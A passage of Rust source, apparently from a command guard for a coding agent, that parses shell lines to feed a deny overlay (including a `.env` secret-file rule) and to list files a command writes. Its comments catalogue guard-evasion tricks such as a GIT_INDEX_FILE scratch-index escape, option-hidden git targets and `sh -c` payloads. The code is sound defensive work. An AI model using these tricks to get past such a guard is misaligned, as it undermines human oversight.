        match piece {
            Piece::Sep(sep) => {
                segs.push(std::mem::take(&mut cur));
                cur.piped = sep == Sep::Pipe;
            }
            Piece::Word(w) => cur.words.push(w),
            Piece::Redirect { kind, target } => cur.redirects.push((kind, target)),
        }
    }
    segs.push(cur);
    segs
}

/// One segment of a step thread's command line, read for the deny
/// overlay: the words a command entry is matched against, the literal
/// words among them, and whether its command word could not be read.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct SegRead {
    /// The effective words: leading assignments and introducers, the
    /// forwarders ([`FORWARDERS`]) with their own words and options, and
    /// `git`'s global options are gone, and `git add --all` reads as
    /// `git add -A`. A redirection's target is not here, whatever its
    /// kind: it goes to `literal`, which the overlay's `.env` rule reads,
    /// and the command entries only look at the front, so nothing that
    /// writes can be judged from this list alone.
    pub words: Vec<String>,
    /// Every raw word of the segment, in order, before anything is
    /// stripped. The effective words are the wrong list to judge a
    /// spelling by: the reader steps over `git`'s global options, so
    /// `git -C /elsewhere reset` and `git reset` read alike without the
    /// raw words to compare.
    pub as_written: Vec<String>,
    /// Whether the segment carries a redirection of any kind. `words`
    /// cannot see a target, so a guard that must not be talked past by
    /// `git reset --soft <sha> > file` asks this.
    pub redirects: bool,
    /// The literal words only, paths among them: the `.env` rule is a
    /// literal-only guard, so a word holding an unresolved `$var` or a
    /// substitution is not a path it can read.
    pub literal: Vec<String>,
    /// One of the segment's words could not be read: the command word,
    /// or a `-c` payload, is broken, a substitution or an unresolved
    /// `$var`; a forwarder or `git` was given an option no table knows;
    /// or a table's expected option value or positional word is missing.
    /// Nothing about what would run can be read.
    pub unreadable: bool,
    /// One of the segment's raw words assigns `GIT_INDEX_FILE`, so a git
    /// command here works on a scratch index the runner's tree check
    /// never sees. Read off the raw words: the inline assignment is gone
    /// from `words` and the `export` form's is not leading there.
    pub sets_index: bool,
}

/// Every segment of a command line, its substitutions expanded, as the
/// deny overlay reads it. One read serves every entry.
pub(crate) fn segment_reads(command: &str) -> Vec<SegRead> {
    let mut out = Vec::new();
    reads_within(command, &mut out, 0);
    out
}

fn reads_within(src: &str, out: &mut Vec<SegRead>, depth: usize) {
    if depth > MAX_DEPTH {
        // Deeper than the classifier goes: the overlay cannot read it
        // either, so it says so instead of guessing.
        out.push(SegRead {
            words: Vec::new(),
            as_written: Vec::new(),
            redirects: false,
            literal: Vec::new(),
            unreadable: true,
            sets_index: false,
        });
        return;
    }
    let mut nested: Vec<String> = Vec::new();
    for seg in segments(Scanner::scan(src)) {
        let (read, inner) = read_segment(&seg);
        nested.extend(inner);
        out.push(read);
    }
    for sub in nested {
        reads_within(&sub, out, depth + 1);
    }
}

/// One segment: its effective words, and the command lines hiding in it
/// (substitutions, and a `sh -c` payload).
fn read_segment(seg: &Segment) -> (SegRead, Vec<String>) {
    let mut unreadable = false;
    // A word that assigns `GIT_INDEX_FILE` is the scratch-index escape
    // however it is spelled: quoted, bare or an unresolved variable all
    // assign in bash, and `is_assignment` excludes the last two because
    // it is about command words.
    let sets_index = seg.words.iter().any(assigns_index);
    let mut nested: Vec<String> = Vec::new();
    // Every substitution runs, whatever the word is for.
    for word in &seg.words {
        unreadable |= word.broken;
        nested.extend(word.subs.iter().cloned());
    }
    let mut literal: Vec<String> = Vec::new();
    for (kind, target) in &seg.redirects {
        unreadable |= target.broken;
        nested.extend(target.subs.iter().cloned());
        if matches!(kind, Redir::Proc) {
            // `>(cmd)` runs a command of its own, not a path.
            nested.push(target.text.clone());
        } else if target.literal() {
            literal.push(target.text.clone());
        }
    }

    // The command word, past leading assignments and introducers and the
    // forwarders ([`FORWARDERS`]) with all their own words. The first
    // word that is none of the three is the command word.
    let words: Vec<&Word> = seg.words.iter().collect();
    let mut at = 0;
    while at < words.len() {
        if is_assignment(words[at]) || introduces(words[at]) {
            at += 1;
        } else if let Some((consumed, bad)) = forward(&words, at) {
            unreadable |= bad;
            at += consumed;
        } else {
            break;
        }
    }
    if words
        .get(at)
        .is_some_and(|cmd| cmd.broken || cmd.var || !cmd.subs.is_empty())
    {
        unreadable = true;
    }

    let mut effective: Vec<String> = Vec::new();
    let git_at = at;
    if words.get(at).is_some_and(|w| names(w, &["git"])) {
        effective.push("git".to_owned());
        let mut j = at + 1;
        while let Some(opt) = words.get(j) {
            let text = opt.text.as_str();
            if !text.starts_with('-') {
                // A non-option word is the command word.
                break;
            }
            if text == "--" {
                j += 1;
                break;
            }
            if !opt.literal() {
                // A quoted or substituted option word: no table reads it.
                unreadable = true;
                break;
            }
            if text.starts_with("--") {
                let (name, has_value) = match text.split_once('=') {
                    Some((name, _)) => (name, true),
                    None => (text, false),
                };
                if GIT_FLAGS.contains(&name) {
                    j += 1;
                } else if GIT_VALUES.contains(&name) {
                    if has_value {
                        j += 1;
                    } else if words.get(j + 1).is_some() {
                        j += 2;
                    } else {
                        // The option swallowed what would have followed.
                        unreadable = true;
                        break;
                    }
                } else {
                    // An option no table knows may take the next word.
                    unreadable = true;
                    break;
                }
            } else {
                let head = &text[..text.len().min(2)];
                if GIT_VALUES.contains(&head) {
                    if text.len() > 2 {
                        // The rest of the word is the value.
                        j += 1;
                    } else if words.get(j + 1).is_some() {
                        j += 2;
                    } else {
                        unreadable = true;
                        break;
                    }
                } else if GIT_FLAGS.contains(&head) {
                    j += 1;
                } else {
                    unreadable = true;
                    break;
                }
            }
        }
        at = j;
    }

    for word in words.iter().skip(at) {
        if !word.text.is_empty() {
            effective.push(word.text.clone());
            if word.literal() {
                literal.push(word.text.clone());
            }
        }
    }
    // `git add --all` is the same entry as `git add -A`.
    if effective.len() >= 3
        && effective[0] == "git"
        && effective[1] == "add"
        && effective[2] == "--all"
    {
        effective[2] = "-A".to_owned();
    }
    // pull's own options are the rebase the `git pull --rebase` entry
    // names, so the rewrite feeds that entry rather than a rule of its
    // own: a list that names no pull entry refuses nothing.
    if effective.len() >= 2
        && effective[0] == "git"
        && effective[1] == "pull"
        && pull_rebase(&words[git_at..])
    {
        effective.truncate(2);
        effective.push("--rebase".to_owned());
    }

    if words
        .get(at)
        .is_some_and(|w| names(w, &["sh", "bash", "dash", "zsh"]))
        && let Some(payload) = dash_c(&words[at + 1..])
    {
        if payload.broken || payload.var || !payload.subs.is_empty() {
            unreadable = true;
        } else {
            nested.push(payload.text.clone());
        }
    }

    (
        SegRead {
            words: effective,
            as_written: seg.words.iter().map(|w| w.text.clone()).collect(),
            redirects: !seg.redirects.is_empty(),
            literal,
            unreadable,
            sets_index,
        },
        nested,
    )
}

/// Whether pull's own options ask for a rebase: `-c pull.rebase`,
/// `-c pull.rebase=<value>`, `--rebase=<value>` or `-r=<value>`. The
/// last such word decides, as it would for git; anything but `false`,
/// `no`, `off` or `0` asks for one. `words` starts at the segment's
/// `git`, so a word before `pull` counts (`git -c pull.rebase=true
/// pull`), and a bare `--rebase` or `-r` needs no reading — an entry
/// matches it as written.
fn pull_rebase(words: &[&Word]) -> bool {
    let mut asked = false;
    for (i, w) in words.iter().enumerate().skip(1) {
        let text = w.text.as_str();
        let after_c = words[i - 1].text == "-c";
        let value = if text == "pull.rebase" && after_c {
            Some("true")
        } else if let Some(value) = text.strip_prefix("pull.rebase=")
            && after_c
        {
            Some(value)
        } else if let Some(value) = text.strip_prefix("--rebase=") {
            Some(value)
        } else {
            text.strip_prefix("-r=")
        };
        if let Some(value) = value {
            asked = !matches!(
                value.to_ascii_lowercase().as_str(),
                "false" | "no" | "off" | "0"
            );
        }
    }
    asked
}

/// Read one forwarder's own words from `at`: how many words its name,
/// options and positional words consume, and whether a word its table
/// expects is missing. `None` when the word at `at` names no forwarder.
fn forward(words: &[&Word], at: usize) -> Option<(usize, bool)> {
    let row = FORWARDERS.iter().find(|f| names(words[at], &[f.name]))?;
    let start = at;
    let mut i = at + 1;
    let mut bad = false;
    while let Some(w) = words.get(i) {
        if w.text == "--" && w.literal() {
            // The options end here; the positional words follow.
            i += 1;
            break;
        }
        if !w.text.starts_with('-') {
            break;
        }
        if !w.literal() {
            // A quoted or substituted option word: no table reads it.
            bad = true;
            i += 1;
            break;
        }
        if w.text.starts_with("--") {
            let (name, has_value) = match w.text.split_once('=') {
                Some((name, _)) => (name, true),
                None => (w.text.as_str(), false),
            };
            if row.flags.contains(&name) {
                i += 1;
            } else if row.values.contains(&name) {
                if has_value {
                    i += 1;
                } else if i + 1 < words.len() {
                    i += 2;
                } else {
                    bad = true;
                    break;
                }
            } else if row.stops.contains(&name) {
                // The wrapper runs nothing of its own: no command word
                // follows.
                return Some((i - start, bad));
            } else {
                bad = true;
                break;
            }
        } else {
            // A short cluster: `-n5`, `-uroot`, `-abc`.
            let letters: Vec<char> = w.text[1..].chars().collect();
            if !letters.is_empty() && letters.iter().all(|c| c.is_ascii_digit()) {
                // `nice -5`: the wrapper's numeric option.
                i += 1;
                continue;
            }
            let mut takes_next = false;
            let mut stopped = false;
            let mut unknown = false;
            for (k, ch) in letters.iter().enumerate() {
                let short = format!("-{ch}");
                if row.values.contains(&short.as_str()) {
                    // The rest of the word is the value when it has one.
                    takes_next = k + 1 == letters.len();
                    break;
                } else if row.flags.contains(&short.as_str()) {
                    continue;
                } else if row.stops.contains(&short.as_str()) {
                    stopped = true;
                    break;
                } else {
                    unknown = true;
                    break;
                }
            }
            if unknown {
                bad = true;
                break;
            }
            if stopped {
                return Some((i - start, bad));
            }
            if takes_next {
                if i + 1 < words.len() {
                    i += 2;
                } else {
                    bad = true;
                    break;
                }
            } else {
                i += 1;
            }
        }
    }
    // The wrapper's own positional words.
    for _ in 0..row.positional {
        if i < words.len() {
            i += 1;
        } else {
            bad = true;
            break;
        }
    }
    Some((i - start, bad))
}

/// The word a `sh -c` option gives the shell to run: the first option
/// cluster carrying a `c` (`-c`, `-lc`), and the word after it.
fn dash_c<'a>(rest: &[&'a Word]) -> Option<&'a Word> {
    for (n, word) in rest.iter().enumerate() {
        let text = word.text.as_str();
        if word.literal()
            && text.starts_with('-')
            && !text.starts_with("--")
            && text[1..].contains('c')
        {
            return rest.get(n + 1).copied();
        }
    }
    None
}

/// A word whose final path component is exactly one of `names`, and
/// nothing else: `/usr/bin/git` and `./git` name `git` too, since PATH
/// decides which program a bare name reaches. Accepted over-match: a
/// directory named `git` (`dir.git/git`) names it too, which is the safe
/// direction. A word carrying a substitution never matches.
fn names(word: &Word, names: &[&str]) -> bool {
    !word.var
        && word.subs.is_empty()
        && names.iter().any(|name| {
            word.text == *name
                || word
                    .text
                    .strip_suffix(name)
                    .is_some_and(|head| head.ends_with('/'))
        })
}

/// A line the old marker check would have called compound: more than
/// one segment, or a substitution anywhere in it.
pub(crate) fn is_compound(src: &str) -> bool {
    let segs = segments(Scanner::scan(src));
    segs.iter().any(|s| {
        s.words.iter().any(|w| !w.subs.is_empty())
            || s.redirects
                .iter()
                .any(|(k, t)| matches!(k, Redir::Proc) || !t.subs.is_empty())
    }) || segs
        .iter()
        .filter(|s| !s.words.is_empty() || !s.redirects.is_empty())
        .count()
        > 1
}

/// A `bash` row's one segment (issue #21): the words of the segment
/// that carries the line's work — the first that is more than
/// harmless, so a `cd x && cargo test …` setup reads as the test it
/// sets up and `cargo test 2>&1 | grep … | head` reads as
/// `cargo test`. Redirections stay off (`2>&1` is plumbing) and a
/// word that is only a substitution shows nothing; the whole command
/// is the pager's business.
pub fn main_segment(command: &str) -> String {
    classify(command, &crate::rules::default_bash_allow(), &[]).main
}

/// `2>&1`, `>&2`: a duplication onto a descriptor number, which writes no
/// file. `>&word` with anything else is the old `> word` spelling.
fn duplicates_a_descriptor(kind: Redir, target: &Word) -> bool {
    kind == Redir::Dup
        && target.literal()
        && !target.text.is_empty()
        && target.text.bytes().all(|b| b.is_ascii_digit())
}

/// The file a command writes, or the files it writes.
///
/// The reader is loose on purpose: a command it does not name contributes
/// nothing, so what it cannot read keeps the ordinary rule and the file
/// boundary in place rather than gaining a verdict of its own.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Writer {
    /// `tee`: every file word.
    Tee,
    /// `cp`, `mv`, `install`, `ln`: the last file word, or `-t`'s
    /// directory.
    LastFile,
    /// `touch`, `mkdir`, `rmdir`, `rm`.
    EveryFile,
    /// `truncate`: as [`Writer::EveryFile`], but `-s`/`--size`/`-r`/
    /// `--reference` name a length, not a file.
    Truncate,
    /// `sed`: its file words, and only while one of its words asks for an
    /// in-place edit.
    Sed,
    /// `sort`: the value of `-o`/`--output`.
    SortOutput,
    /// `dd`: the value of an `of=` word.
    DdOf,
    /// `find`: the file of a `-fprint` family action always, and the path
    /// words when the expression deletes what it finds.
    Find,
}

/// The command word's writer, read off its final path component: `/bin/cp`
/// and `cp` are the same command, as they are for the allow list.
fn writer_of(word: &Word) -> Option<Writer> {
    if word.broken || word.var || !word.subs.is_empty() {
        return None;
    }
    match word.text.rsplit('/').next().unwrap_or(&word.text) {
        "tee" => Some(Writer::Tee),
        "cp" | "mv" | "install" | "ln" => Some(Writer::LastFile),
        "touch" | "mkdir" | "rmdir" | "rm" => Some(Writer::EveryFile),
        "truncate" => Some(Writer::Truncate),
        "sed" => Some(Writer::Sed),
        "sort" => Some(Writer::SortOutput),
        "dd" => Some(Writer::DdOf),
        "find" => Some(Writer::Find),
        _ => None,
    }
}

/// One word a command line writes through, with the directory a relative
/// one names a path in.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WriteTarget {
    /// The word as written: `~` and `$var` unexpanded, nothing
    /// canonicalised.
    pub word: String,
    /// The directory `word` resolves against when it is relative: the
    /// caller's, with every `cd <dir>` word before it on the same command
    /// line applied. `None` when the caller named none.
    pub cwd: Option<PathBuf>,
}

/// The words a command line writes through, in the order read, duplicates
/// kept: a redirection that writes, the file arguments of the commands
/// [`Writer`] names, and the same reading of every `$(…)` they hide.
///
/// The words come back as written, `~` and `$var` unexpanded, and nothing
/// is canonicalised: resolving a word to a path is the caller's. What the
/// reader cannot see is not reported, a miss rather than a verdict: a
/// program named inside one word (`sh -c '…'`, an `xargs` program), a
/// process substitution, a heredoc body, a forwarder whose table ran out,
/// and a command no entry names.
pub fn write_targets(command: &str) -> Vec<String> {
    write_targets_from(command, None)
        .into_iter()
        .map(|target| target.word)
        .collect()
}

/// [`write_targets`], each word with the directory a relative one resolves
/// against: a `cd <dir>` word sets the directory for the words after it, so
/// `cd /elsewhere && echo x > f` writes `/elsewhere/f`. A relative `dir` is
/// measured from `cwd`, and its own leading `~` is `$HOME`. A `cd` word
/// moves the directory for every later segment whatever separates them, so
/// a backgrounded or piped `cd` — which moves no shell — is read as if it
/// did. A `cd` word the reader cannot read — one holding a `$var` or a
/// substitution, or none at all — leaves the directory as it last knew it;
/// another directory-changing word (`pushd`, a `chdir` inside a program) is
/// not read at all. As with [`write_targets`], a form the reader cannot see
/// leaves the caller's own reading in place.
pub fn write_targets_from(command: &str, cwd: Option<&Path>) -> Vec<WriteTarget> {
    let mut out = Vec::new();
    targets_within(command, cwd, &mut out, 0);
    out
}

fn targets_within(src: &str, cwd: Option<&Path>, out: &mut Vec<WriteTarget>, depth: usize) {
    if depth > MAX_DEPTH {
        return;
    }
    let mut here = cwd.map(Path::to_path_buf);
    for seg in segments(Scanner::scan(src)) {
        let mut words: Vec<String> = Vec::new();
        let mut nested: Vec<String> = Vec::new();
        targets_of_segment(&seg, &mut words, &mut nested);
        out.extend(words.into_iter().map(|word| WriteTarget {
            word,
            cwd: here.clone(),
        }));
        for sub in nested {
            targets_within(&sub, here.as_deref(), out, depth + 1);
        }
        if let Some(dir) = changed_dir(&seg, here.as_deref()) {
            here = Some(dir);
        }
    }
}

/// The directory a `cd <dir>` segment changes to: `dir` measured from
/// `cwd` when it is relative, a leading `~` as `$HOME`, and left
/// uncanonicalised for the caller to resolve, so a symlink or a `..`
/// settles where the words are read. `None` when the segment's command is
/// not `cd`, or its word names no directory the reader can see — a `$var`,
/// a substitution, an option word, or no word at all.
fn changed_dir(seg: &Segment, cwd: Option<&Path>) -> Option<PathBuf> {
    let words: Vec<&Word> = seg.words.iter().collect();
    let rest = command_words(&words)?;
    if rest[0].text != "cd" {
        return None;
    }
    let dir = rest[1..].iter().find(|word| file_word(word, false))?;
    // A quoted word is read: its text is what runs. Only a word holding a
    // `$var`, a substitution or an unclosed construct hides its directory.
    if dir.broken || dir.var || !dir.subs.is_empty() {
        return None;
    }
    let path = match crate::expand_home(&dir.text) {
        Some(expanded) => expanded,
        None => PathBuf::from(&dir.text),
    };
    if path.is_absolute() {
        return Some(path);
    }
    cwd.map(|cwd| cwd.join(path))
}

/// One segment's write targets: its redirecting redirections first, then
/// the files its command writes, then its substitutions for the caller to
/// read as command lines of their own.
fn targets_of_segment(seg: &Segment, out: &mut Vec<String>, nested: &mut Vec<String>) {
    for (kind, target) in &seg.redirects {
        let writes = match kind {
            Redir::Out | Redir::Append => true,
            Redir::Dup => !duplicates_a_descriptor(*kind, target),
            // `<`, `<<`, `<<<` read, and `<(…)`/`>(…)` run a command the
            // lexer has no kind for; neither names a file here.
            Redir::In | Redir::Proc => false,
        };
        if writes {
            push_target(out, target);
        }
        nested.extend(target.subs.iter().cloned());
    }

    // Every substitution inside a word runs, whatever the word is for.
    let words: Vec<&Word> = seg.words.iter().collect();
    for word in &words {
        nested.extend(word.subs.iter().cloned());
    }
    let Some(rest) = command_words(&words) else {
        return;
    };
    let Some(writer) = writer_of(rest[0]) else {
        return;
    };
    written_files(writer, &rest[1..], out);
}

/// The words from the command word on: past the leading assignments and
/// introducers, past the forwarders with all their own words (`sudo cp a
/// f` is `cp a f`), as [`read_segment`] reads them. `None` when there is no
/// command word, or when the forwarder's own table ran out: what would run
/// behind an unknown forwarder suffix is not read.
fn command_words<'a>(words: &[&'a Word]) -> Option<Vec<&'a Word>> {
    let mut at = 0;
    while at < words.len() {
        if is_assignment(words[at]) || introduces(words[at]) {
            at += 1;
        } else if let Some((consumed, bad)) = forward(words, at) {
            if bad {
                return None;
            }
            at += consumed;
        } else {
            break;
        }
    }
    words.get(at).map(|_| words[at..].to_vec())
}

/// Whether a word names a file argument: not an option word, unless `--`
/// has ended the options, and not a word the lexer could not finish.
fn file_word(word: &Word, options_ended: bool) -> bool {
    !word.broken && !word.text.is_empty() && (options_ended || !word.text.starts_with('-'))
}

/// A target as written, when it is a word the lexer could finish reading.
fn push_target(out: &mut Vec<String>, word: &Word) {
    if !word.broken && !word.text.is_empty() {
        out.push(word.text.clone());
    }
}

/// The files one command's own words write, in the order read.
fn written_files(writer: Writer, args: &[&Word], out: &mut Vec<String>) {
    match writer {
        Writer::Tee => every_file(args, &[], out),
        Writer::EveryFile => every_file(args, &[], out),
        Writer::Truncate => every_file(args, &["-s", "--size", "-r", "--reference"], out),
        Writer::LastFile => last_file(args, out),
        Writer::Sed => sed_files(args, out),
        Writer::SortOutput => option_value(args, "-o", "--output", out),
        Writer::DdOf => {
            for word in args {
                if let Some(value) = word.text.strip_prefix("of=") {
                    push_text(out, word, value);
                }
            }
        }
        Writer::Find => find_files(args, out),
    }
}

/// Every file word: `--` ends the options, and a value the lexer cannot
/// read is no target.
fn every_file(args: &[&Word], value_options: &[&str], out: &mut Vec<String>) {
    let mut options_ended = false;
    let mut value_follows = false;
    for word in args {
        if !options_ended && word.text == "--" {
            options_ended = true;
            continue;
        }
        if value_follows {
            value_follows = false;
            continue;
        }
        if !options_ended && value_options.contains(&word.text.as_str()) {
            // `truncate -s 0 f`: the number is a length, not a file.
            value_follows = true;
            continue;
        }
        if file_word(word, options_ended) {
            push_target(out, word);
        }
    }
}

/// `cp a b f`: the last file word, or the directory `-t` names.
fn last_file(args: &[&Word], out: &mut Vec<String>) {
    let mut options_ended = false;
    let mut directory: Option<&Word> = None;
    let mut last: Option<&Word> = None;
    let mut i = 0;
    while i < args.len() {
        let word = args[i];
        if !options_ended && word.text == "--" {
            options_ended = true;
            i += 1;
            continue;
        }
        if !options_ended {
            if word.text.starts_with("--target-directory=") {
                directory = Some(word);
                i += 1;
                continue;
            }
            if matches!(word.text.as_str(), "-t" | "--target-directory") {
                if let Some(next) = args.get(i + 1) {
                    directory = Some(next);
                }
                i += 2;
                continue;
            }
        }
        if file_word(word, options_ended) {
            last = Some(word);
        }
        i += 1;
    }
    // `--target-directory=d` carries its own value, past the `=`; the
    // separated form's value is the word behind it.
    if let Some(word) = directory {
        match word.text.split_once('=') {
            Some((_, value)) => push_text(out, word, value),
            None => push_target(out, word),
        }
    } else if let Some(word) = last {
        push_target(out, word);
    }
}

/// `sed -i s/a/b/ f g`: the file words, only while a word asks for the
/// in-place edit. `-e`/`-f` name the script, so every other file word is a
/// file; without them the first file word is the script.
fn sed_files(args: &[&Word], out: &mut Vec<String>) {
    let in_place = args.iter().any(|w| {
        let t = w.text.as_str();
        t.starts_with("--in-place")
            || (t.starts_with('-') && !t.starts_with("--") && t[1..].contains('i'))
    });
    if !in_place {
        return;
    }
    let script_option = args.iter().any(|w| {
        let t = w.text.as_str();
        matches!(t, "-e" | "--expression" | "-f" | "--file")
            || t.starts_with("--expression=")
            || t.starts_with("--file=")
            || (t.starts_with('-')
                && !t.starts_with("--")
                && t.len() > 1
                && t[1..].starts_with(['e', 'f']))
    });
    let mut options_ended = false;
    let mut script_follows = false;
    let mut script_seen = script_option;
    for word in args {
        if !options_ended && word.text == "--" {
            options_ended = true;
            continue;
        }
        if script_follows {
            script_follows = false;
            continue;
        }
        if !options_ended && matches!(word.text.as_str(), "-e" | "--expression" | "-f" | "--file") {
            script_follows = true;
            continue;
        }
        if !file_word(word, options_ended) {
            continue;
        }
        if !script_seen {
            // The first file word is the script itself.
            script_seen = true;
            continue;
        }
        push_target(out, word);
    }
}

/// `sort -o f in`: the option's value, attached (`-of`, `--output=f`) or
/// the word behind it.
fn option_value(args: &[&Word], short: &str, long: &str, out: &mut Vec<String>) {
    let mut i = 0;
    while i < args.len() {
        let text = args[i].text.as_str();
        if let Some(value) = text.strip_prefix(&format!("{long}=")) {
            push_text(out, args[i], value);
        } else if text == long || text == short {
            if let Some(next) = args.get(i + 1) {
                push_target(out, next);
            }
            i += 2;
            continue;
        } else if let Some(value) = text.strip_prefix(short)
            && !text.starts_with("--")
            && !value.is_empty()
        {
            push_text(out, args[i], value);
        }
        i += 1;
    }
}

/// `find f -delete`, `find f -fprint g`: the file a printing action names,
/// and the path words when the expression deletes so that the targets are
/// the files found.
fn find_files(args: &[&Word], out: &mut Vec<String>) {
    let printing = args
        .iter()
        .position(|w| is_fprint(w.text.as_str()))
        .and_then(|at| args.get(at + 1));
    if let Some(word) = printing {
        push_target(out, word);
    }
    if args.iter().any(|w| w.text == "-delete") {
        for word in args.iter().take_while(|w| !w.text.starts_with('-')) {
            push_target(out, word);
        }
    }
}

/// `-fprint`, `-fprint0`, `-fprintf`, `-fls`: the find actions that name a
/// file to write to.
fn is_fprint(text: &str) -> bool {
    matches!(text, "-fprint" | "-fprint0" | "-fprintf" | "-fls")
}

/// A value out of an option word: `--output=f` and `-of` carry it, and an
/// empty one names no file.
fn push_text(out: &mut Vec<String>, word: &Word, value: &str) {
    if !word.broken && !value.is_empty() {
        out.push(value.to_owned());
    }
}

/// One segment of a command line, for callers that need the parts
/// rather than the whole line's verdict.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ScanSegment {
    /// The segment's words, quotes stripped, joined by a space, with a
    /// bare descriptor number on a redirection dropped (`2>&1` is
    /// plumbing, not a word).
    pub text: String,
    /// The same words, one to an entry; `segment_text`'s words exactly,
    /// so a caller can compare either.
    pub words: Vec<String>,
    /// The text of every `$(...)` and backtick substitution in the
    /// segment, for a caller to read as command lines of their own: a
    /// redirection target's first, in `redirects` order, then each
    /// word's. Quotes and a nested substitution are inside the text,
    /// and an unclosed one is here too; a process substitution is a
    /// redirection of its own and not in the list.
    pub subs: Vec<String>,
    /// The target of each of its redirections, in order, except a
    /// descriptor duplication (`2>&1`, `>&2`), which names no file. A
    /// digit target of any other redirection (`> 1`, `2>1`) is a file
    /// and stays (#56's third review).
    pub redirects: Vec<String>,
    /// What the segment is, under the default allow list and no grants.
    pub kind: Kind,
    /// Whether the `Write` came from the command itself — a writing
    /// flag (`sed -i`, `sort -o`) or a command folded out of a `$(…)`
    /// in one of its words — rather than only from its redirections.
    /// `false` on a segment that does not write at all.
    pub write_from_command: bool,
    /// Whether a `|` feeds this segment from the previous one (not
    /// `&&`, `;` or `||`): the segment reads the line before it, so
    /// what that line printed left through a pipe rather than landing
    /// in the log.
    pub piped: bool,
}

/// Split a command line into segments and classify each one, against
/// the default allow list and no grants: the parts, not the verdict.
///
/// The rules for a whole line ([`classify`] through `main_segment`)
/// read a line as one thing; a caller that has to recognise an exact
/// command — the same segment, nothing chained after it — needs the
/// segments themselves, with the words and the redirection targets
/// unjoined.
pub fn scan(command: &str) -> Vec<ScanSegment> {
    let allow = crate::rules::default_bash_allow();
    segments(Scanner::scan(command))
        .iter()
        // A heredoc leaves an empty segment behind its terminator; a
        // segment with neither words nor redirections is not a part of
        // the line.
        .filter(|seg| !(seg.words.is_empty() && seg.redirects.is_empty()))
        .map(|seg| {
            let class = classify_segment(seg, &allow, &[], 0);
            ScanSegment {
                text: segment_text(seg),
                words: segment_words(seg).iter().map(|w| w.to_string()).collect(),
                subs: seg
                    .redirects
                    .iter()
                    .flat_map(|(_, target)| target.subs.iter().cloned())
                    .chain(seg.words.iter().flat_map(|word| word.subs.iter().cloned()))
                    .collect(),
                redirects: seg
                    .redirects
                    .iter()
                    .filter(|(kind, target)| !duplicates_a_descriptor(*kind, target))
                    .map(|(_, w)| w.text.clone())
                    .collect(),
                kind: class.kind,
                write_from_command: class.write_from_command,
                piped: seg.piped,
            }
        })
        .collect()
}

struct Scanner {
    chars: Vec<char>,
    at: usize,
    out: Vec<Piece>,
    /// Heredocs seen on the line being scanned, waiting for bodies.
    heredocs: VecDeque<(String, bool)>,
}

impl Scanner {
    fn scan(src: &str) -> Vec<Piece> {
        let mut s = Self {
            chars: src.chars().collect(),
            at: 0,
            out: Vec::new(),
            heredocs: VecDeque::new(),
        };
        s.run(None);
        s.out
    }

    /// Lex until the end, or the `)` that closes a substitution
    /// (consumed) when `stop` is set. Returns the index just past the
    /// stop, or `None` at the end of the text.
    fn run(&mut self, stop: Option<char>) -> Option<usize> {
        let mut depth = 0usize;
        while self.at < self.chars.len() {
            let c = self.chars[self.at];
            if let Some(s) = stop {
                if c == s {
                    if depth == 0 {
                        self.at += 1;
                        return Some(self.at);
                    }
                    depth -= 1;
                    self.at += 1;
                    self.out.push(Piece::Sep(Sep::Other));
                    continue;
                }
                if c == '(' {
                    depth += 1;
                    self.at += 1;
                    self.out.push(Piece::Sep(Sep::Other));
                    continue;
                }
            }
            match c {
                '\n' => {
                    self.at += 1;
                    self.out.push(Piece::Sep(Sep::Other));
                    self.skip_heredoc_bodies();
                }
                c if c.is_whitespace() => self.at += 1,
                '|' => {
                    self.at += 1;
                    // `||` is a break; a lone `|` is a pipe.
                    let sep = if self.take_if('|') {
                        Sep::Other
                    } else {
                        Sep::Pipe
                    };
                    self.out.push(Piece::Sep(sep));
                }
                '&' => {
                    self.at += 1;
                    match self.peek() {
                        Some('&') => {
                            self.at += 1;
                            self.out.push(Piece::Sep(Sep::Other));
                        }
                        // &> and &>>: both streams into a file.
                        Some('>') => {
                            self.at += 1;
                            let append = self.take_if('>');
                            let kind = if append { Redir::Append } else { Redir::Out };
                            let target = self.word();
                            self.out.push(Piece::Redirect { kind, target });
                        }
                        _ => self.out.push(Piece::Sep(Sep::Other)),
                    }
                }
                ';' => {
                    self.at += 1;
                    self.take_if(';');
                    self.out.push(Piece::Sep(Sep::Other));
                }
                '(' | ')' => {
                    self.at += 1;
                    self.out.push(Piece::Sep(Sep::Other));
                }
                // A comment starts a word; `a#b` is one word.
                '#' => {
                    while self.at < self.chars.len() && self.chars[self.at] != '\n' {
                        self.at += 1;
                    }
                }
                '<' => self.redirect_in(),
                '>' => self.redirect_out(),
                _ => {
                    let w = self.word();
                    self.out.push(Piece::Word(w));
                }
            }
        }
        None
    }

    /// At `<`: input, a heredoc, a herestring, or a process
    /// substitution.
    fn redirect_in(&mut self) {
        self.at += 1;
        if self.peek() == Some('(') {
            self.at += 1;
            let target = self.sub_word();
            self.out.push(Piece::Redirect {
                kind: Redir::Proc,
                target,
            });
            return;
        }
        if self.peek() == Some('<') {
            self.at += 1;
            let dash = self.take_if('-');
            let delim = self.word();
            if !delim.text.is_empty() {
                self.heredocs.push_back((delim.text.clone(), dash));
            }
            self.out.push(Piece::Redirect {
                kind: Redir::In,
                target: delim,
            });
            return;
        }
        let kind = match self.peek() {
            // <>: opened for reading and writing.
            Some('>') => {
                self.at += 1;
                Redir::Out
            }
            Some('&') => {
                self.at += 1;
                Redir::Dup
            }
            _ => Redir::In,
        };
        let target = self.word();
        self.out.push(Piece::Redirect { kind, target });
    }

    /// At `>`: output, append, a descriptor duplicate, or a process
    /// substitution.
    fn redirect_out(&mut self) {
        self.at += 1;
        if self.peek() == Some('(') {
            self.at += 1;
            let target = self.sub_word();
            self.out.push(Piece::Redirect {
                kind: Redir::Proc,
                target,
            });
            return;
        }
        let kind = match self.peek() {
            Some('&') => {
                self.at += 1;
                Redir::Dup
            }
            // >|: clobbers.
            Some('|') => {
                self.at += 1;
                Redir::Out
            }
            Some('>') => {
                self.at += 1;
                Redir::Append
            }
            _ => Redir::Out,
        };
        let target = self.word();
        self.out.push(Piece::Redirect { kind, target });
    }

    /// After a newline, the bodies of the line's heredocs: data, never
    /// commands, so the scanner steps over each one.
    fn skip_heredoc_bodies(&mut self) {
        while let Some((delim, dash)) = self.heredocs.pop_front() {
            loop {
                let start = self.at;
                while self.at < self.chars.len() && self.chars[self.at] != '\n' {
                    self.at += 1;
                }
                let ended = self.peek() == Some('\n');
                if ended {
                    self.at += 1;
                }
